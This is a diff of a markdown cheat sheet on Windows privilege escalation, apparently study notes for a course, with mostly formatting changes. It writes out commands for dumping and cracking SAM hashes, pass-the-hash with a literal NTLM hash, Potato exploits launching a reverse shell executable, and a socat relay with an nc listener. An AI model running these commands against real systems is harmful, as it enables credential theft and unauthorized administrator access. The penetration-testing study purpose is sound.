@@ -86,15 +86,15 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
   - SAM & SYSTEM
     - if you get SAM & SYSTEM can used to dump hashes by the following steps
       - first: Download the latest version of the creddump suite:
-      # git clone https://github.com/Neohapsis/creddump7.git
+      > git clone https://github.com/Neohapsis/creddump7.git
       - Second: Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
-      # python2 creddump7/pwdump.py SYSTEM SAM
+      > python2 creddump7/pwdump.py SYSTEM SAM
       - Finally: Crack the admin user hash using hashcat:
-      # hashcat-m 1000 --force [the hash] /usr/share/wordlists/rockyou.txt
+      > hashcat-m 1000 --force [the hash] /usr/share/wordlists/rockyou.txt
       - Note: you can passing the hash concept using tools like: pth-winexe
-      # pth-winexe-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+      > pth-winexe-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
       - or spawn a SYSTEM level command prompt:
-      # pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+      > pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
       
       
 5- Scheduled Tasks
@@ -102,7 +102,7 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
   - List all scheduled tasks your user:
     > schtasks /query /fo LIST /v
   - in PowerShell 
-    > Get-ScheduledTask| where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State
+    > Get-ScheduledTask | where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State
     
 6- Startup Apps
   - Windows has a startup directory for apps that should start for all users:
@@ -124,23 +124,23 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
     
 7- Installed Apps exploits:
   - enumerate running programs:
-    - tasklist /v
-    - .\seatbelt.exe NonstandardProcesses
-    - .\winPEASany.exe quiet procesinfo
+    > tasklist /v
+    > .\seatbelt.exe NonstandardProcesses
+    > .\winPEASany.exe quiet procesinfo
   - when you see an intersting app search for exploits in (exploit-db, google, GitHub, others)
   
 8- Hot Potato:
   - Potato.exe
     - https://github.com/foxglovesec/Potato/blob/master/source/Potato/Potato/bin/Release/Potato.exe
     - working on Windows 7
-    - .\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+    > .\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
     
  9- Token Impersonation:
-    - "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
+   - "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
     
-    - Juicy Potato
+   - Juicy Potato
       - https://github.com/ohpe/juicy-potato
-      # C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+      > C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
       - "-c" argument take CLSID, so if it doesn't work check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md or run GetCLSID.ps1 PowerShell script.
     
    - Rogue Potato:
@@ -151,12 +151,12 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
       - Usage:
         - On Kali:
           - First: Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows (192.168.1.22 is the Windows IP):
-            # sudo socat tcp-listen:135,reuseaddr,fork tcp:[Windows IP Machine]:9999
+            > sudo socat tcp-listen:135,reuseaddr,fork tcp:[Windows IP Machine]:9999
           - Second: start listener
-            # nc -lvp [Port assign in reverse.exe shell]
+            > nc -lvp [Port assign in reverse.exe shell]
         
         - On Windows Victim machine:
-        # C:\PrivEsc\RoguePotato.exe-r [Kali IP Machine] –l 9999 -e "C:\PrivEsc\reverse.exe"
+        > C:\PrivEsc\RoguePotato.exe-r [Kali IP Machine] –l 9999 -e "C:\PrivEsc\reverse.exe"
         
      - PrintSpoofer:
         - PrintSpoofer is an exploit that targets the Print Spooler service.
@@ -168,12 +168,20 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
         
 ## Privileges Escalition:
   1- Check your user (whoami) and groups (net user <username>)
+  
   2- Run winPEASwith fast, searchfast, and cmdoptions.
+  
   3- Run Seatbelt & other scripts as well!
+  
   4- If your scripts are failing and you don’t know why, you can always run the manual commands from this course, and other Windows PrivEsc cheatsheets online (e.g. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+  
   5- Spend some time and read over the results of your enumeration.
+  
   `If WinPEAS or another tool finds something interesting, make a note of it. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.`
+  
   `Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\and C:\Program Files).Read through interesting files that you find, as they may contain useful information that could help escalate privileges.`
+  
   `Try things that don’t have many steps first, e.g. registry exploits, services, etc.Have a good look at admin processes, enumerate their versions and search for exploits.Check for internal ports that you might be able to forward to your attacking machine.`
+  
   `If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.This might be a process or file name you aren’t familiar with or even a username.At this stage you can also start to think about Kernel Exploits.`
   
